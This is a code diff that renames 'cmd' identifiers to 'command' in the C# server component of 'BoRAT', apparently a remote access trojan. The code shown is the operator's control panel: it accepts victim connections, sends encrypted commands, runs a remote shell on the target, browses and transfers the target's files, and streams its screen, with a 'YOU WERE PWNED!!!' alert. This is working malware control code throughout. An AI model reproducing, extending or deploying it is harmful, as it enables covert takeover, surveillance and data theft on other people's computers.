@@ -88,9 +88,9 @@ namespace BoRAT.Server
             setPanel(PanelClients);
         }
 
-        private void btnCmd_Click(object sender, EventArgs e)
+        private void btnCommand_Click(object sender, EventArgs e)
         {
-            setPanel(PanelCmd);
+            setPanel(PanelCommand);
         }
 
         private void btnFileManager_Click(object sender, EventArgs e)
@@ -107,7 +107,7 @@ namespace BoRAT.Server
         private void setPanel(object sender)
         {
             /* PanelClients.Visible = false;
-            PanelCmd.Visible = false;
+            PanelCommand.Visible = false;
             PanelFileManager.Visible = false;
             PanelRdp.Visible = false;
             ((Panel)sender).Visible = true; */
@@ -160,8 +160,8 @@ namespace BoRAT.Server
             var id = listSockets.Count;
             addClientID(id);
             updateStatus();
-            var cmd = string.Format("getInfo~{0}", id);
-            sendCmd(cmd, id);
+            var command = string.Format("getInfo~{0}", id);
+            sendCommand(command, id);
             //create info & command
             connection.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, connection);
             serverSocket.BeginAccept(AcceptcallBack, null);
@@ -216,29 +216,29 @@ namespace BoRAT.Server
                 }
         }
 
-        private void processNormalInfo(byte[] receivedBuffer, string cmd = "")
+        private void processNormalInfo(byte[] receivedBuffer, string command = "")
         {
-            cmd = Encoding.Unicode.GetString(receivedBuffer);
-            cmd = Decrypt(cmd);
+            command = Encoding.Unicode.GetString(receivedBuffer);
+            command = Decrypt(command);
 
-            if (cmd.Equals("pwned")) MessageBox.Show("YOU WERE PWNED!!!");
-            if (cmd.StartsWith("infoBack"))
+            if (command.Equals("pwned")) MessageBox.Show("YOU WERE PWNED!!!");
+            if (command.StartsWith("infoBack"))
             {
-                var info = cmd.Split('|');
+                var info = command.Split('|');
                 addClientInfo(info[1]);
             }
 
-            else if (cmd.StartsWith("cmdout§"))
+            else if (command.StartsWith("commandout§"))
             {
-                var results = cmd.Split('§')[1];
+                var results = command.Split('§')[1];
                 updateUI(() => Logs.Text += results);
             }
 
-            else if (cmd.StartsWith("drivesList~"))
+            else if (command.StartsWith("drivesList~"))
             {
                 updateUI(() => listFileManager.Items.Clear());
 
-                var drives = cmd.Split('~')[1];
+                var drives = command.Split('~')[1];
                 var drivesList = drives.Split('\n');
                 foreach (var driverInfo in drivesList)
                 {
@@ -252,10 +252,10 @@ namespace BoRAT.Server
                 }
             }
 
-            else if (cmd.StartsWith("enterPath~"))
+            else if (command.StartsWith("enterPath~"))
             {
                 updateUI(() => listFileManager.Items.Clear());
-                var info = cmd.Split('~')[1];
+                var info = command.Split('~')[1];
                 var directories = info.Split('\n');
 
                 foreach (var s in directories)
@@ -271,9 +271,9 @@ namespace BoRAT.Server
                 }
             }
 
-            else if (cmd.StartsWith("backPath~"))
+            else if (command.StartsWith("backPath~"))
             {
-                var info = cmd.Split('~')[1];
+                var info = command.Split('~')[1];
 
                 if (info.Equals("driveList"))
                 {
@@ -283,20 +283,20 @@ namespace BoRAT.Server
                 else
                 {
                     dirPath = info;
-                    sendCmdToTarget("enterPath~" + info);
+                    sendCommandToTarget("enterPath~" + info);
                 }
             }
 
-            else if (cmd.StartsWith("fInfo~"))
+            else if (command.StartsWith("fInfo~"))
             {
-                var size = int.Parse(cmd.Split('~')[1]);
+                var size = int.Parse(command.Split('~')[1]);
                 fdlSize = size;
                 receiveFile = new byte[fdlSize];
                 isFileDownload = true;
-                sendCmdToTarget("fdlConfirm");
+                sendCommandToTarget("fdlConfirm");
             }
 
-            else if (cmd.Equals("fupConfirm"))
+            else if (command.Equals("fupConfirm"))
             {
                 updateUI(() => LogsFileManager.Text += "Upload Request Accepted.\n" +
                                                        "Uploading " + Path.GetFileName(fup_location) + " To " +
@@ -305,14 +305,14 @@ namespace BoRAT.Server
                 sendFileToTarget(dataToSend);
             }
 
-            else if (cmd.Equals("fileReceived"))
+            else if (command.Equals("fileReceived"))
             {
                 updateUI(() => LogsFileManager.Text += "Uploaded.\n");
             }
 
-            else if (cmd.StartsWith("error~"))
+            else if (command.StartsWith("error~"))
             {
-                processErrors(cmd.Split('~')[1]);
+                processErrors(command.Split('~')[1]);
             }
         }
 
@@ -339,9 +339,9 @@ namespace BoRAT.Server
 
         private void processErrors(string errorText)
         {
-            if (errorText.Contains("cmdFaild"))
+            if (errorText.Contains("commandFaild"))
             {
-                MessageBox.Show("Start Cmd Before Use!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Start Command Before Use!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
 
@@ -350,19 +350,19 @@ namespace BoRAT.Server
                 updateUI(() => LogsFileManager.Text += errorText);
         }
 
-        private void sendCmd(string cmd, int id)
+        private void sendCommand(string command, int id)
         {
             var socket = listSockets[id - 1];
-            var data = Encoding.Unicode.GetBytes(cmd);
+            var data = Encoding.Unicode.GetBytes(command);
             socket.Send(data);
         }
 
-        private void sendCmdToTarget(string cmd)
+        private void sendCommandToTarget(string command)
         {
             if (targetClient != null)
             {
-                cmd = Encrypt(cmd);
-                var dataToSend = Encoding.Unicode.GetBytes(cmd);
+                command = Encrypt(command);
+                var dataToSend = Encoding.Unicode.GetBytes(command);
                 targetClient.Send(dataToSend);
             }
 
@@ -488,7 +488,7 @@ namespace BoRAT.Server
                 updateStatus(statusText);
 
                 updateUI(() =>
-                    lblStatusCmdShell.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
+                    lblStatusCommandShell.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                 updateUI(() =>
                     lblStatusFileManager.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                 updateUI(
@@ -500,9 +500,9 @@ namespace BoRAT.Server
         {
             if (e.KeyCode == Keys.Return)
             {
-                var info = "cmd§" + txtCommand.Text;
+                var info = "command§" + txtCommand.Text;
                 //targetClient.Send(Encoding.Unicode.GetBytes(info));
-                sendCmdToTarget(info);
+                sendCommandToTarget(info);
                 txtCommand.Text = "";
             }
 
@@ -512,11 +512,11 @@ namespace BoRAT.Server
             }
         }
 
-        private void runCmdShellToolStripMenuItem_Click(object sender, EventArgs e)
+        private void runCommandShellToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //byte[] data = Encoding.Unicode.GetBytes("startCmd");
+            //byte[] data = Encoding.Unicode.GetBytes("startCommand");
             //targetClient.Send(data);
-            sendCmdToTarget("startCmd");
+            sendCommandToTarget("startCommand");
         }
 
         public string Encrypt(string clearText)
@@ -603,7 +603,7 @@ namespace BoRAT.Server
         private void drivesListToolStripMenuItem_Click(object sender, EventArgs e)
         {
             dirPath = "dirvesList";
-            sendCmdToTarget("drivesList");
+            sendCommandToTarget("drivesList");
         }
 
         private void enterToolStripMenuItem_Click(object sender, EventArgs e)
@@ -612,7 +612,7 @@ namespace BoRAT.Server
             {
                 var pathToEnter = listFileManager.SelectedItems[0].SubItems[3].Text;
                 dirPath = pathToEnter;
-                sendCmdToTarget("enterPath~" + pathToEnter);
+                sendCommandToTarget("enterPath~" + pathToEnter);
             }
         }
 
@@ -620,7 +620,7 @@ namespace BoRAT.Server
         {
             if (dirPath.Equals("dirvesList"))
                 return;
-            sendCmdToTarget("backPath~" + dirPath);
+            sendCommandToTarget("backPath~" + dirPath);
         }
 
         private void Logs_TextChanged(object sender, EventArgs e)
@@ -651,7 +651,7 @@ namespace BoRAT.Server
                 var filename = listFileManager.SelectedItems[0].SubItems[3].Text;
                 updateUI(() => LogsFileManager.Text += "Sending Download Request ...\n");
                 fdl_location = "ratDownloads\\" + Path.GetFileName(filename);
-                sendCmdToTarget("fdl~" + filename);
+                sendCommandToTarget("fdl~" + filename);
             }
         }
 
@@ -668,7 +668,7 @@ namespace BoRAT.Server
             info += "\\" + fileName + "~" + new FileInfo(fup_location).Length;
 
             LogsFileManager.Text += "Sending Upload Request ...";
-            sendCmdToTarget("fup~" + info);
+            sendCommandToTarget("fup~" + info);
         }
 
         private void btnStartRdp_Click(object sender, EventArgs e)
@@ -676,7 +676,7 @@ namespace BoRAT.Server
             fullScreenRdp = new frmRdp();
             fullScreen = false;
             isImage = true;
-            sendCmdToTarget("rdpStart");
+            sendCommandToTarget("rdpStart");
         }
 
         private void btnRdpStop_Click(object sender, EventArgs e)
@@ -688,7 +688,7 @@ namespace BoRAT.Server
             updateUI(() => comboRdp.SelectedIndex = 0);
             if (fullScreenRdp != null)
                 fullScreenRdp.Close();
-            sendCmdToTarget("rdpStop");
+            sendCommandToTarget("rdpStop");
         }
 
         private void comboRdp_SelectedIndexChanged(object sender, EventArgs e)
